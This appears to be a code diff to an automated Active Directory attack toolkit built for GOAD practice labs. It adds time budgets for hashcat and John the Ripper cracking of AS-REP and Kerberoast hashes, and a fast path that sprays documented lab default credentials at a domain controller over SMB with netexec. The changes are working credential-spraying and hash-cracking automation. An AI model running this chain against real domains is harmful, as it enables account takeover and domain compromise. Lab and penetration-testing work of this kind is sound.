@@ -42,6 +42,12 @@ def _default_logs_base() -> Path:
 
 
 LOGS_BASE = _default_logs_base()
+
+# Cracking on a headless Kali VM is slow (no GPU) and both live runs stalled on
+# it. Cap the on-box rockyou pass to a budget; anything longer belongs on the
+# host (scripts/host-crack.sh). Quick lab wordlists still run to completion.
+CRACK_BUDGET = max(15, int(os.environ.get("ADTK_CRACK_BUDGET", "90") or 90))
+
 # LOOT is the per-target tree logs/<dc-ip>/. It starts at the base and is
 # rebound by set_target() once we know the DC, so each target keeps its own
 # auto/state.json, hashes, bloodhound, etc.
@@ -373,6 +379,27 @@ def goad_wordlist() -> Path:
     return p
 
 
+def goad_creds() -> list[tuple[str, str]]:
+    """Stock GOAD user:password pairs (public lab defaults) for the fast path."""
+    conf = Path(__file__).resolve().parent.parent / "conf"
+    for c in (
+        Path("/opt/adtk/conf/creds.goad"),
+        Path("/opt/adtk/conf/creds.goad.example"),
+        conf / "creds.goad",
+        conf / "creds.goad.example",
+    ):
+        if c.exists():
+            pairs = []
+            for line in c.read_text(errors="ignore").splitlines():
+                line = line.strip()
+                if not line or line.startswith("#") or ":" not in line:
+                    continue
+                u, p = line.split(":", 1)
+                pairs.append((u, p))
+            return pairs
+    return []
+
+
 def wordlists(profile: str) -> list[Path]:
     out = []
     if profile == "goad":
@@ -424,19 +451,30 @@ def crack(mode: str, hashfile: Path, profile: str) -> dict[str, str]:
     cracked: dict[str, str] = {}
     hc = which("hashcat")
     pot = LOOT / "auto" / f"pot_{mode}.txt"
+
+    def is_big(wl: Path) -> bool:
+        # rockyou-class lists get only the budget; small lab lists run in full.
+        try:
+            return "rockyou" in wl.name.lower() or wl.stat().st_size > 2_000_000
+        except OSError:
+            return False
+
     if hc and hashcat_usable(hc):
         for wl in wordlists(profile):
             if not wl.exists():
                 continue
+            budget = CRACK_BUDGET if is_big(wl) else 120
             run(
                 [
                     hc, "-m", mode, str(hashfile), str(wl),
                     "--quiet", "--potfile-path", str(pot),
-                    "--outfile", str(pot), "--outfile-format", "3",
+                    "--runtime", str(budget),
                 ],
-                timeout=240,
+                timeout=budget + 30,
             )
             if pot.exists():
+                # potfile is stable hash:plain; split on the LAST colon (krb
+                # hashes contain a colon of their own).
                 for line in pot.read_text(errors="ignore").splitlines():
                     if ":" not in line:
                         continue
@@ -455,7 +493,11 @@ def crack(mode: str, hashfile: Path, profile: str) -> dict[str, str]:
         for wl in wordlists(profile):
             if not wl.exists():
                 continue
-            run([john, f"--format={fmt}", f"--wordlist={wl}", str(hashfile)], timeout=180)
+            budget = CRACK_BUDGET if is_big(wl) else 120
+            # --max-run-time makes john stop itself at the budget (no mid-run
+            # kill) so the chain keeps moving; offload the rest to the host.
+            run([john, f"--format={fmt}", f"--wordlist={wl}",
+                 f"--max-run-time={budget}", str(hashfile)], timeout=budget + 30)
             shown = run([john, "--show", f"--format={fmt}", str(hashfile)], timeout=30)
             for line in shown.splitlines():
                 if ":" in line:
@@ -649,8 +691,11 @@ def act_asrep(st: State) -> bool:
         st.add_cred(Cred(user, password=pw, role="user", source="asrep"), f"AS-REP {user}")
         progressed = True
     if names and not cracked:
-        print(f"[*] AS-REP hashes for {names} — did not crack")
-        st.next_manual.append(f"Crack 18200: {outf}")
+        print(f"[*] AS-REP hashes for {names} — not cracked in {CRACK_BUDGET}s budget")
+        st.next_manual.append(
+            f"Crack 18200 on the HOST (VM has no GPU): pull {outf}, then "
+            f"host-crack.sh --mode 18200 --hash asrep.txt --background; keep enumerating meanwhile"
+        )
     st.mark("asrep")
     return progressed
 
@@ -664,6 +709,27 @@ def act_spray(st: State) -> bool:
     lock = parse_lockout(pol)
     if lock is not None:
         st.lockout = lock
+
+    # Fast path: on GOAD-family labs the documented stock creds land a foothold
+    # (often DA-grade) in one paired check, before any users.txt exists. This is
+    # a known-answer check (one guess per known pair), not a blind wordlist, so
+    # it does not iterate a wordlist per account into lockout.
+    if st.profile == "goad" and not st.best:
+        pairs = goad_creds()
+        if pairs:
+            su = LOOT / "auto" / "stock-users.txt"
+            sp = LOOT / "auto" / "stock-pass.txt"
+            su.write_text("\n".join(u for u, _ in pairs) + "\n")
+            sp.write_text("\n".join(p for _, p in pairs) + "\n")
+            print(f"[*] stock-cred fast path — {len(pairs)} documented pairs")
+            blob = run(
+                [nxc, "smb", st.dc, "-u", str(su), "-p", str(sp),
+                 "--no-bruteforce", "--continue-on-success"],
+                timeout=180,
+            )
+            ingest_ok(st, blob, "stock cred")
+            st.add_users([u for u, _ in pairs])
+
     uf = users_file(st)
     if not uf.exists() or uf.stat().st_size == 0:
         print("[*] no users.txt — skip spray")
@@ -748,7 +814,10 @@ def act_kerberoast(st: State) -> bool:
         st.add_cred(Cred(user, password=pw, role="svc", source="kerberoast"), f"kerberoast {user}")
         progressed = True
     if names and not cracked:
-        st.next_manual.append(f"Crack 13100: {outf}  ({', '.join(names)})")
+        st.next_manual.append(
+            f"Crack 13100 on the HOST (VM has no GPU): pull {outf} ({', '.join(names)}), then "
+            f"host-crack.sh --mode 13100 --hash kerb.txt --background; keep enumerating meanwhile"
+        )
     st.mark("kerberoast")
     return progressed
 
@@ -1318,6 +1387,17 @@ def decide(st: State, abuse: bool) -> Optional[str]:
     if not st.users and not st.has("unauth"):
         return "unauth"
     if not st.best:
+        # On known labs (GOAD family) the documented stock creds are the fastest
+        # foothold — often DA-grade — so spray them before AS-REP roasting. Other
+        # profiles keep the cheap AS-REP-first order.
+        if st.profile == "goad":
+            if not st.has("spray"):
+                return "spray"
+            if not st.has("asrep"):
+                return "asrep"
+            if not st.has("unauth"):
+                return "unauth"
+            return None
         if not st.has("asrep"):
             return "asrep"
         if not st.has("spray"):
